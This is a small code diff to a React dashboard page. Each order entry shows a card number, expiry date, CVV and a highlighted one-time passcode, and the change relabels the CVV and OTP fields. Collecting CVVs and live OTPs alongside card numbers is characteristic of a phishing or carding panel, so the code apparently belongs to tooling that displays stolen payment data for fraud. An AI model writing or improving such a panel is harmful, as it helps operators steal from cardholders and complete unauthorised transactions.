@@ -101,8 +101,8 @@ export default function DashboardPage() {
                     <CardHeader>
                       <CardTitle>cardNumber: {order.cardNumber}</CardTitle>
                       <CardDescription>ExpDate: {order.expiryDate}</CardDescription>
-                      <CardDescription>OTP: {order.cvv}</CardDescription>
-                    <strong className='text-red-400'>{order.otp}</strong>
+                      <CardDescription>CVV: {order.cvv}</CardDescription>
+                   OTP:  <strong className='text-red-400'>{order.otp}</strong>
 
                     </CardHeader>
                     <CardContent>
